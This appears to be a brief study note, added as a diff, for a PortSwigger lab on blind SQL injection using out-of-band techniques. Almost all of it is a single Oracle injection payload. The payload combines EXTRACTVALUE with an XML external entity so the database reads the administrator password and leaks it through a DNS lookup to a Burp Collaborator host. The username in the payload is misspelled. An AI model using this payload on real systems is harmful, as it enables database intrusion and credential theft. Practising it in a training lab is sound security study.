@@ -1,0 +1,8 @@
+Lab Link: https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-exploiting-blind-sql-injection-using-out-of-band-oast-techniques/sql-injection/blind/lab-out-of-band-data-exfiltration#
+
+
+
+collaborator Link:
+ksg00hhjjow0sbqn9hhobiwlwc23qwel.oastify.com
+
+' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password from users where username='administrtaor')||'.ksg00hhjjow0sbqn9hhobiwlwc23qwel.oastify.com/"> %remote;]>'),'/l') FROM dual)-- 
